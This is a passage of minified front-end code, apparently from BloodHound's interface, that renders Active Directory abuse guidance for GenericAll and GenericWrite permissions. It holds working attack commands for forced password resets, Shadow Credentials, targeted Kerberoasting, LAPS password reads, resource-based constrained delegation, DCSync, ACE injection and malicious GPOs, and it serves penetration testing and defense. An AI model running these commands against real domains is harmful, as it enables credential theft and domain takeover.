$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsx(t,{variant:"body2",children:"Then create a secure string object for the password you want to set on the target user:"}),e.jsx(t,{component:"pre",children:"$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force"}),e.jsxs(t,{variant:"body2",children:["Finally, use Set-DomainUserPassword, optionally specifying $Cred if you are not already running a process as ",r,":"]}),e.jsx(t,{component:"pre",children:"Set-DomainUserPassword -Identity andy -AccountPassword $UserPassword -Credential $Cred"}),e.jsx(t,{variant:"body2",children:"Now that you know the target user's plain text password, you can either start a new agent as that user, or use that user's credentials in conjunction with PowerView's ACL abuse functions, or perhaps even RDP to a system the target user has access to. For more ideas and information, see the references tab."}),e.jsx(t,{variant:"body1",children:" Shadow Credentials attack "}),e.jsx(t,{variant:"body2",children:"To abuse the permission, use Whisker. "}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",a==="User"||a==="Computer"?`${r} if you are not running a process as that user/computer`:`a member of ${r} if you are not running a process as a member`]}),e.jsx(t,{component:"pre",children:"Whisker.exe add /target:<TargetPrincipal>"}),e.jsx(t,{variant:"body2",children:"For other optional parameters, view the Whisker documentation."}),e.jsx(t,{variant:"body1",children:" Targeted Kerberoast attack "}),e.jsx(t,{variant:"body2",children:"A targeted kerberoast attack can be performed using PowerView's Set-DomainObject along with Get-DomainSPNTicket."}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",a==="User"?`${r} if you are not running a process as that user`:`a member of ${r} if you are not running a process as a member`,". To do this in conjunction with Set-DomainObject, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsxs(t,{variant:"body2",children:["Then, use Set-DomainObject, optionally specifying $Cred if you are not already running a process as ",r,":"]}),e.jsx(t,{component:"pre",children:"Set-DomainObject -Credential $Cred -Identity harmj0y -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}"}),e.jsx(t,{variant:"body2",children:"After running this, you can use Get-DomainSPNTicket as follows:"}),e.jsx(t,{component:"pre",children:"Get-DomainSPNTicket -Credential $Cred harmj0y | fl"}),e.jsx(t,{variant:"body2",children:"The recovered hash can be cracked offline using the tool of your choice. Cleanup of the ServicePrincipalName can be done with the Set-DomainObject command:"}),e.jsx(t,{component:"pre",children:"Set-DomainObject -Credential $Cred -Identity harmj0y -Clear serviceprincipalname"})]});case"Computer":return c?e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:["The GenericAll permission grants ",r," the ability to obtain the LAPS (RID 500 administrator) password of ",o,"."]}),e.jsxs(t,{variant:"body2",children:["GenericAll also grants ",r,' the permission to write to the "msds-KeyCredentialLink" attribute of ',o,'. Writing to this property allows an attacker to create "Shadow Credentials" on the object and authenticate as the principal using kerberos PKINIT. This is equivalent to the "AddKeyCredentialLink" edge.']}),e.jsx(t,{variant:"body2",children:"Alternatively, GenericAll on a computer object can be used to perform a Resource-Based Constrained Delegation attack."}),e.jsx(t,{variant:"body1",children:" Retrieve LAPS Password "}),e.jsxs(t,{variant:"body2",children:["For systems using legacy LAPS, the following AD computer object properties are relevant:",e.jsx("br",{}),e.jsx("b",{children:"- ms-Mcs-AdmPwd"}),": The plaintext LAPS password",e.jsx("br",{}),e.jsx("b",{children:"- ms-Mcs-AdmPwdExpirationTime"}),": The LAPS password expiration time",e.jsx("br",{})]}),e.jsxs(t,{variant:"body2",children:["For systems using Windows LAPS (2023 edition), the following AD computer object properties are relevant:",e.jsx("br",{}),e.jsx("b",{children:"- msLAPS-Password"}),": The plaintext LAPS password",e.jsx("br",{}),e.jsx("b",{children:"- msLAPS-PasswordExpirationTime"}),": The LAPS password expiration time",e.jsx("br",{}),e.jsx("b",{children:"- msLAPS-EncryptedPassword"}),": The encrypted LAPS password",e.jsx("br",{}),e.jsx("b",{children:"- msLAPS-EncryptedPasswordHistory"}),": The encrypted LAPS password history",e.jsx("br",{}),e.jsx("b",{children:"- msLAPS-EncryptedDSRMPassword"}),": The encrypted Directory Services Restore Mode (DSRM) password",e.jsx("br",{}),e.jsx("b",{children:"- msLAPS-EncryptedDSRMPasswordHistory"}),": The encrypted DSRM password history",e.jsx("br",{})]}),e.jsx(t,{variant:"body2",children:"Plaintext attributes can be read using a simple LDAP client. For example, with PowerView:"}),e.jsx(t,{component:"pre",children:'Get-DomainComputer "MachineName" -Properties "cn","ms-mcs-admpwd","ms-mcs-admpwdexpirationtime"'}),e.jsx(t,{variant:"body2",children:"Encrypted attributes can be decrypted using Microsoft's LAPS PowerShell module. For example:"}),e.jsx(t,{component:"pre",children:'Get-LapsADPassword "WIN10" -AsPlainText'}),e.jsxs(t,{variant:"body2",children:["The encrypted attributes can also be retrieved and decrypted using"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/xpn/RandomTSScripts/tree/master/lapsv2decrypt",children:"lapsv2decrypt"})," ","(dotnet or BOF)."]}),e.jsx(t,{variant:"body1",children:" Shadow Credentials attack "}),e.jsx(t,{variant:"body2",children:"To abuse the permission, use Whisker. "}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",a==="User"||a==="Computer"?`${r} if you are not running a process as that user/computer`:`a member of ${r} if you are not running a process as a member`]}),e.jsx(t,{component:"pre",children:"Whisker.exe add /target:<TargetPrincipal>"}),e.jsx(t,{variant:"body2",children:"For other optional parameters, view the Whisker documentation."}),e.jsx(t,{variant:"body1",children:" Resource-Based Constrained Delegation attack "}),e.jsx(t,{variant:"body2",children:"Abusing this primitive is possible through the Rubeus project."}),e.jsx(t,{variant:"body2",children:"First, if an attacker does not control an account with an SPN set, Kevin Robertson's Powermad project can be used to add a new attacker-controlled computer account:"}),e.jsx(t,{component:"pre",children:"New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)"}),e.jsx(t,{variant:"body2",children:"PowerView can be used to then retrieve the security identifier (SID) of the newly created computer account:"}),e.jsx(t,{component:"pre",children:"$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid"}),e.jsx(t,{variant:"body2",children:"We now need to build a generic ACE with the attacker-added computer SID as the principal, and get the binary bytes for the new DACL/ACE:"}),e.jsx(t,{component:"pre",children:`$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)`}),e.jsx(t,{variant:"body2",children:"Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the computer account we're taking over, again using PowerView in this case:"}),e.jsx(t,{component:"pre",children:"Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}"}),e.jsx(t,{variant:"body2",children:"We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:"}),e.jsx(t,{component:"pre",children:"Rubeus.exe hash /password:Summer2018!"}),e.jsx(t,{variant:"body2",children:`And finally we can use Rubeus' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:`}),e.jsx(t,{component:"pre",children:"Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt"})]}):e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:["The GenericAll grants ",r,' the permission to write to the "msds-KeyCredentialLink" attribute of ',o,'. Writing to this property allows an attacker to create "Shadow Credentials" on the object and authenticate as the principal using kerberos PKINIT. This is equivalent to the "AddKeyCredentialLink" edge.']}),e.jsx(t,{variant:"body2",children:"Alternatively, GenericAll on a computer object can be used to perform a Resource-Based Constrained Delegation attack."}),e.jsx(t,{variant:"body1",children:" Shadow Credentials attack "}),e.jsx(t,{variant:"body2",children:"To abuse the permission, use Whisker. "}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",a==="User"||a==="Computer"?`${r} if you are not running a process as that user/computer`:`a member of ${r} if you are not running a process as a member`]}),e.jsx(t,{component:"pre",children:"Whisker.exe add /target:<TargetPrincipal>"}),e.jsx(t,{variant:"body2",children:"For other optional parameters, view the Whisker documentation."}),e.jsx(t,{variant:"body1",children:" Resource-Based Constrained Delegation attack "}),e.jsx(t,{variant:"body2",children:"Abusing this primitive is possible through the Rubeus project."}),e.jsx(t,{variant:"body2",children:"First, if an attacker does not control an account with an SPN set, Kevin Robertson's Powermad project can be used to add a new attacker-controlled computer account:"}),e.jsx(t,{component:"pre",children:"New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)"}),e.jsx(t,{variant:"body2",children:"PowerView can be used to then retrieve the security identifier (SID) of the newly created computer account:"}),e.jsx(t,{component:"pre",children:"$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid"}),e.jsx(t,{variant:"body2",children:"We now need to build a generic ACE with the attacker-added computer SID as the principal, and get the binary bytes for the new DACL/ACE:"}),e.jsx(t,{component:"pre",children:`$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)`}),e.jsx(t,{variant:"body2",children:"Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the computer account we're taking over, again using PowerView in this case:"}),e.jsx(t,{component:"pre",children:"Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}"}),e.jsx(t,{variant:"body2",children:"We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:"}),e.jsx(t,{component:"pre",children:"Rubeus.exe hash /password:Summer2018!"}),e.jsx(t,{variant:"body2",children:`And finally we can use Rubeus' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:`}),e.jsx(t,{component:"pre",children:"Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt"})]});case"Domain":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body1",children:"DCSync attack"}),e.jsx(t,{variant:"body2",children:"Full control of a domain object grants you both DS-Replication-Get-Changes as well as DS-Replication-Get-Changes-All rights. The combination of these rights allows you to perform the dcsync attack using mimikatz. To grab the credential of the user harmj0y using these rights:"}),e.jsx(t,{component:"pre",children:"lsadump::dcsync /domain:testlab.local /user:harmj0y"}),e.jsx(t,{variant:"body1",children:"Generic Descendent Object Takeover"}),e.jsx(t,{variant:"body2",children:"The simplest and most straight forward way to obtain control of the objects of the domain is to apply a GenericAll ACE on the domain that will inherit down to all object types. This can be done using PowerView. This time we will use the New-ADObjectAccessControlEntry, which gives us more control over the ACE we add to the domain object."}),e.jsx(t,{variant:"body2",children:"Next, we will fetch the GUID for all objects. This should be '00000000-0000-0000-0000-000000000000':"}),e.jsx(t,{component:"pre",children:`$Guids = Get-DomainGUIDMap
$AllObjectsPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'All'} | select -ExpandProperty name`}),e.jsx(t,{variant:"body2",children:'Then we will construct our ACE. This command will create an ACE granting the "JKHOLER" user full control of all descendant objects:'}),e.jsx(t,{component:"pre",children:"$ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity 'JKOHLER' -Right GenericAll -AccessControlType Allow -InheritanceType All -InheritedObjectType $AllObjectsPropertyGuid"}),e.jsx(t,{variant:"body2",children:"Finally, we will apply this ACE to the domain:"}),e.jsx(t,{component:"pre",children:`$DomainDN = "DC=dumpster,DC=fire"
$dsEntry = [ADSI]"LDAP://$DomainDN"
$dsEntry.PsBase.Options.SecurityMasks = 'Dacl'
$dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)
$dsEntry.PsBase.CommitChanges()`}),e.jsx(t,{variant:"body2",children:'Now, the "JKOHLER" user will have full control of all descendent objects of each type.'}),e.jsx(t,{variant:"body1",children:"Targeted Descendent Object Takeoever"}),e.jsx(t,{variant:"body2",children:`If you want to be more targeted with your approach, it is possible to specify precisely what right you want to apply to precisely which kinds of descendent objects. You could, for example, grant a user "ForceChangePassword" permission against all user objects, or grant a security group the ability to read every GMSA password under a certain OU. Below is an example taken from PowerView's help text on how to grant the "ITADMIN" user the ability to read the LAPS password from all computer objects in the "Workstations" OU:`}),e.jsx(t,{component:"pre",children:`$Guids = Get-DomainGUIDMap
$AdmPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'ms-Mcs-AdmPwd'} | select -ExpandProperty name
$CompPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'Computer'} | select -ExpandProperty name
$ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity itadmin -Right ExtendedRight,ReadProperty -AccessControlType Allow -ObjectType $AdmPropertyGuid -InheritanceType All -InheritedObjectType $CompPropertyGuid
$OU = Get-DomainOU -Raw Workstations
$DsEntry = $OU.GetDirectoryEntry()
$dsEntry.PsBase.Options.SecurityMasks = 'Dacl'
$dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)
$dsEntry.PsBase.CommitChanges()`}),e.jsx(t,{variant:"body1",children:"Objects for which ACL inheritance is disabled"}),e.jsx(t,{variant:"body2",children:"The compromise vector described above relies on ACL inheritance and will not work for objects with ACL inheritance disabled, such as objects protected by AdminSDHolder (attribute adminCount=1). This observation applies to any user or computer with inheritance disabled, including objects located in nested OUs."}),e.jsx(t,{variant:"body2",children:"In such a situation, it may still be possible to exploit GenericAll permissions on a domain object through an alternative attack vector. Indeed, with GenericAll permissions over a domain object, you may make modifications to the gPLink attribute of the domain. The ability to alter the gPLink attribute of a domain may allow an attacker to apply a malicious Group Policy Object (GPO) to all of the domain user and computer objects (including the ones located in nested OUs). This can be exploited to make said child objects execute arbitrary commands through an immediate scheduled task, thus compromising them."}),e.jsx(t,{variant:"body2",children:"Successful exploitation will require the possibility to add non-existing DNS records to the domain and to create machine accounts. Alternatively, an already compromised domain-joined machine may be used to perform the attack. Note that the attack vector implementation is not trivial and will require some setup."}),e.jsxs(t,{variant:"body2",children:["From a domain-joined compromised Windows machine, the gPLink manipulation attack vector may be exploited through Powermad, PowerView and native Windows functionalities. For a detailed outline of exploit requirements and implementation, you can refer to"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://labs.withsecure.com/publications/ou-having-a-laugh",children:"this article"}),"."]}),e.jsx(t,{variant:"body2",children:"Be mindful of the number of users and computers that are in the given domain as they all will attempt to fetch and apply the malicious GPO."}),e.jsx(t,{variant:"body2",children:"Alternatively, the ability to modify the gPLink attribute of a domain can be exploited in conjunction with write permissions on a GPO. In such a situation, an attacker could first inject a malicious scheduled task in the controlled GPO, and then link the GPO to the target domain through its gPLink attribute, making all child users and computers apply the malicious GPO and execute arbitrary commands."})]});case"GPO":return e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"With full control of a GPO, you may make modifications to that GPO which will then apply to the users and computers affected by the GPO. Select the target object you wish to push an evil policy down to, then use the gpedit GUI to modify the GPO, using an evil policy that allows item-level targeting, such as a new immediate scheduled task. Then wait for the group policy client to pick up and execute the new evil policy. See the references tab for a more detailed write up on this abuse."})});case"OU":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body1",children:"Control of the Organization Unit"}),e.jsx(t,{variant:"body2",children:"With full control of the OU, you may add a new ACE on the OU that will inherit down to the objects under that OU. Below are two options depending on how targeted you choose to be in this step:"}),e.jsx(t,{variant:"body1",children:"Generic Descendent Object Takeover"}),e.jsx(t,{variant:"body2",children:"The simplest and most straight forward way to abuse control of the OU is to apply a GenericAll ACE on the OU that will inherit down to all object types. Again, this can be done using PowerView. This time we will use the New-ADObjectAccessControlEntry, which gives us more control over the ACE we add to the OU."}),e.jsxs(t,{variant:"body2",children:["First, we need to reference the OU by its ObjectGUID, not its name. The ObjectGUID for the OU"," ",o," is: ",s,"."]}),e.jsx(t,{variant:"body2",children:"Next, we will fetch the GUID for all objects. This should be '00000000-0000-0000-0000-000000000000':"}),e.jsx(t,{component:"pre",children:`$Guids = Get-DomainGUIDMap
$AllObjectsPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'All'} | select -ExpandProperty name`}),e.jsx(t,{variant:"body2",children:'Then we will construct our ACE. This command will create an ACE granting the "JKHOLER" user full control of all descendant objects:'}),e.jsx(t,{component:"pre",children:"$ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity 'JKOHLER' -Right GenericAll -AccessControlType Allow -InheritanceType All -InheritedObjectType $AllObjectsPropertyGuid"}),e.jsx(t,{variant:"body2",children:"Finally, we will apply this ACE to our target OU:"}),e.jsx(t,{component:"pre",children:`$OU = Get-DomainOU -Raw (OU GUID)
$DsEntry = $OU.GetDirectoryEntry()
$dsEntry.PsBase.Options.SecurityMasks = 'Dacl'
$dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)
$dsEntry.PsBase.CommitChanges()`}),e.jsx(t,{variant:"body2",children:'Now, the "JKOHLER" user will have full control of all descendent objects of each type.'}),e.jsx(t,{variant:"body1",children:"Targeted Descendent Object Takeoever"}),e.jsx(t,{variant:"body2",children:`If you want to be more targeted with your approach, it is possible to specify precisely what right you want to apply to precisely which kinds of descendent objects. You could, for example, grant a user "ForceChangePassword" permission against all user objects, or grant a security group the ability to read every GMSA password under a certain OU. Below is an example taken from PowerView's help text on how to grant the "ITADMIN" user the ability to read the LAPS password from all computer objects in the "Workstations" OU:`}),e.jsx(t,{component:"pre",children:`$Guids = Get-DomainGUIDMap
$AdmPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'ms-Mcs-AdmPwd'} | select -ExpandProperty name
$CompPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'Computer'} | select -ExpandProperty name
$ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity itadmin -Right ExtendedRight,ReadProperty -AccessControlType Allow -ObjectType $AdmPropertyGuid -InheritanceType All -InheritedObjectType $CompPropertyGuid
$OU = Get-DomainOU -Raw Workstations
$DsEntry = $OU.GetDirectoryEntry()
$dsEntry.PsBase.Options.SecurityMasks = 'Dacl'
$dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)
$dsEntry.PsBase.CommitChanges()`}),e.jsx(t,{variant:"body1",children:"Objects for which ACL inheritance is disabled"}),e.jsx(t,{variant:"body2",children:"It is important to note that the compromise vector described above relies on ACL inheritance and will not work for objects with ACL inheritance disabled, such as objects protected by AdminSDHolder (attribute adminCount=1). This observation applies to any OU child user or computer with ACL inheritance disabled, including objects located in nested sub-OUs."}),e.jsx(t,{variant:"body2",children:"In such a situation, it may still be possible to exploit GenericAll permissions on an OU through an alternative attack vector. Indeed, with GenericAll permissions over an OU, you may make modifications to the gPLink attribute of the OU. The ability to alter the gPLink attribute of an OU may allow an attacker to apply a malicious Group Policy Object (GPO) to all of the OU's child user and computer objects (including the ones located in nested sub-OUs). This can be exploited to make said child objects execute arbitrary commands through an immediate scheduled task, thus compromising them."}),e.jsx(t,{variant:"body2",children:"Successful exploitation will require the possibility to add non-existing DNS records to the domain and to create machine accounts. Alternatively, an already compromised domain-joined machine may be used to perform the attack. Note that the attack vector implementation is not trivial and will require some setup."}),e.jsxs(t,{variant:"body2",children:["From a domain-joined compromised Windows machine, the gPLink manipulation attack vector may be exploited through Powermad, PowerView and native Windows functionalities. For a detailed outline of exploit requirements and implementation, you can refer to"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://labs.withsecure.com/publications/ou-having-a-laugh",children:"this article"}),"."]}),e.jsx(t,{variant:"body2",children:"Be mindful of the number of users and computers that are in the given OU as they all will attempt to fetch and apply the malicious GPO."}),e.jsx(t,{variant:"body2",children:"Alternatively, the ability to modify the gPLink attribute of an OU can be exploited in conjunction with write permissions on a GPO. In such a situation, an attacker could first inject a malicious scheduled task in the controlled GPO, and then link the GPO to the target OU through its gPLink attribute, making all child users and computers apply the malicious GPO and execute arbitrary commands."})]});case"Container":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"With full control of the container, you may add a new ACE on the container that will inherit down to the objects under that container."}),e.jsx(t,{variant:"body2",children:"This can be done with PowerShell:"}),e.jsx(w,{children:`$containerDN = "CN=USERS,DC=DUMPSTER,DC=FIRE"
                            $principalName = "principal"     # SAM account name of principal
                            
                            # Find the certificate template
                            $template = [ADSI]"LDAP://$containerDN"
                            
                            # Construct the ACE
                            $account = New-Object System.Security.Principal.NTAccount($principalName)
                            $sid = $account.Translate([System.Security.Principal.SecurityIdentifier])
                            $ace = New-Object DirectoryServices.ActiveDirectoryAccessRule(
                                $sid,
                                [System.DirectoryServices.ActiveDirectoryRights]::GenericAll,
                                [System.Security.AccessControl.AccessControlType]::Allow,
                                [System.DirectoryServices.ActiveDirectorySecurityInheritance]::Descendents
                            )
                            # Add the new ACE to the ACL
                            $acl = $template.psbase.ObjectSecurity
                            $acl.AddAccessRule($ace)
                            $template.psbase.CommitChanges()`})]});case"CertTemplate":return e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"With GenericAll permission over a certificate template, you may be able to perform an ESC4 attack by modifying the template's attributes. BloodHound will in that case create an ADCSESC4 edge from the principal to the forest domain node."})});case"EnterpriseCA":return e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"With GenericAll permission over an enterprise CA, you can publish certificate templates to the enterprise CA by adding the CN name of the template in the enterprise CA object's certificateTemplates attribute. This action may enable you to perform an ADCS domain escalation."})});case"RootCA":return e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"With GenericAll permission over a root CA, you can make a rogue certificate trusted as a root CA in the AD forest by adding the certificate in the root CA object's cACertificate attribute. This action may enable you to perform an ADCS domain escalation."})});case"NTAuthStore":return e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"With GenericAll permission over a NTAuth store, you can make an enterprise CA certificate trusted for NT (domain) authentication in the AD forest by adding the certificate in the root CA object's cACertificate attribute. This action may enable you to perform an ADCS domain escalation."})});case"IssuancePolicy":return e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"With GenericAll permission over an issuance policy object, you create a OID group link to a targeted group by adding the group's distinguishedName in the msDS-OIDToGroupLink attribute of the issuance policy object. This action may enable you to gain membership of the group through an ADCS ESC13 attack."})});default:return e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"No abuse information available for this node type."})})}},Np={general:Rp,windowsAbuse:Gp,linuxAbuse:Ep,opsec:Ip,references:$p},Mp=({sourceName:r,sourceType:a,targetName:o,targetType:i})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[E(a,r)," generic write access to the ",N(i)," ",o,"."]}),e.jsx(t,{variant:"body2",children:'Generic Write access grants you the ability to write to any non-protected attribute on the target object, including "members" for a group, and "serviceprincipalnames" for a user'})]}),Lp=({targetType:r})=>{switch(r){case"Group":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"GenericWrite to a group allows you to directly modify group membership of the group."}),e.jsx(t,{variant:"body2",children:"Use samba's net tool to add the user to the target group. The credentials can be supplied in cleartext or prompted interactively if omitted from the command line:"}),e.jsx(t,{component:"pre",children:'net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'}),e.jsxs(t,{variant:"body2",children:["It can also be done with pass-the-hash using"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/byt3bl33d3r/pth-toolkit",children:"pth-toolkit's net tool"}),". If the LM hash is not known, use 'ffffffffffffffffffffffffffffffff'."]}),e.jsx(t,{component:"pre",children:'pth-net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"'}),e.jsx(t,{variant:"body2",children:"Finally, verify that the user was successfully added to the group:"}),e.jsx(t,{component:"pre",children:'net rpc group members "TargetGroup" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'})]});case"User":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body1",children:" Targeted Kerberoast "}),e.jsxs(t,{variant:"body2",children:["A targeted kerberoast attack can be performed using"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/ShutdownRepo/targetedKerberoast",children:"targetedKerberoast.py"}),"."]}),e.jsx(t,{component:"pre",children:"targetedKerberoast.py -v -d 'domain.local' -u 'controlledUser' -p 'ItsPassword'"}),e.jsx(t,{variant:"body2",children:"The tool will automatically attempt a targetedKerberoast attack, either on all users or against a specific one if specified in the command line, and then obtain a crackable hash. The cleanup is done automatically as well."}),e.jsx(t,{variant:"body2",children:"The recovered hash can be cracked offline using the tool of your choice."}),e.jsx(t,{variant:"body1",children:" Shadow Credentials attack "}),e.jsxs(t,{variant:"body2",children:["To abuse this permission, use"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/ShutdownRepo/pywhisker",children:"pyWhisker"}),"."]}),e.jsx(t,{component:"pre",children:'pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"'}),e.jsx(t,{variant:"body2",children:"For other optional parameters, view the pyWhisker documentation."})]});case"Computer":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body1",children:" Resource-Based Constrained Delegation "}),e.jsx(t,{variant:"body2",children:"First, if an attacker does not control an account with an SPN set, a new attacker-controlled computer account can be added with Impacket's addcomputer.py example script:"}),e.jsx(t,{component:"pre",children:"addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host $DomainController -domain-netbios $DOMAIN 'domain/user:password'"}),e.jsx(t,{variant:"body2",children:"We now need to configure the target object so that the attacker-controlled computer can delegate to it. Impacket's rbcd.py script can be used for that purpose:"}),e.jsx(t,{component:"pre",children:"rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'TargetComputer' -action 'write' 'domain/user:password'"}),e.jsx(t,{variant:"body2",children:`And finally we can get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. Impacket's getST.py example script can be used for that purpose.`}),e.jsx(t,{component:"pre",children:"getST.py -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$:Summer2018!'"}),e.jsx(t,{variant:"body2",children:"This ticket can then be used with Pass-the-Ticket, and could grant access to the file system of the TARGETCOMPUTER."}),e.jsx(t,{variant:"body1",children:" Shadow Credentials attack "}),e.jsxs(t,{variant:"body2",children:["To abuse this permission, use"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/ShutdownRepo/pywhisker",children:"pyWhisker"}),"."]}),e.jsx(t,{component:"pre",children:'pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"'}),e.jsx(t,{variant:"body2",children:"For other optional parameters, view the pyWhisker documentation."})]});case"GPO":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"With GenericWrite over a GPO, you may make modifications to that GPO which will then apply to the users and computers affected by the GPO. Select the target object you wish to push an evil policy down to, then use the gpedit GUI to modify the GPO, using an evil policy that allows item-level targeting, such as a new immediate scheduled task. Then wait at least 2 hours for the group policy client to pick up and execute the new evil policy. See the references tab for a more detailed write up on this abuse."}),e.jsxs(t,{variant:"body2",children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/Hackndo/pyGPOAbuse",children:"pyGPOAbuse.py"})," ","can be used for that purpose."]}),e.jsx(t,{variant:"body2",children:"This edge can be a false positive in rare scenarios. If you have GenericWrite on the GPO with 'This object only' (no inheritance) and no other permissions in the ACL, it is not possible to add or modify settings of the GPO. The GPO's settings are stored in SYSVOL under a folder for the given GPO. Therefore, you need write access to child objects of this folder or create child objects permission. The security descriptor of the GPO is reflected on the folder, meaning permissions to write child items on the GPO are required."})]});case"OU":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"With GenericWrite permissions over an OU, you may make modifications to the gPLink attribute of the OU. The ability to alter the gPLink attribute of an OU may allow an attacker to apply a malicious Group Policy Object (GPO) to all of the OU's child user and computer objects (including the ones located in nested sub-OUs). This can be exploited to make said child items execute arbitrary commands through an immediate scheduled task, thus compromising them."}),e.jsx(t,{variant:"body2",children:"Successful exploitation will require the possibility to add non-existing DNS records to the domain and to create machine accounts. Alternatively, an already compromised domain-joined machine may be used to perform the attack. Note that the attack vector implementation is not trivial and will require some setup."}),e.jsxs(t,{variant:"body2",children:["From a Linux machine, the gPLink manipulation attack vector may be exploited using the"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/synacktiv/OUned",children:"OUned.py"})," ","tool. For a detailed outline of exploit requirements and implementation, you can refer to"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory",children:"the article associated to the OUned.py tool"}),"."]}),e.jsx(t,{variant:"body2",children:"Be mindful of the number of 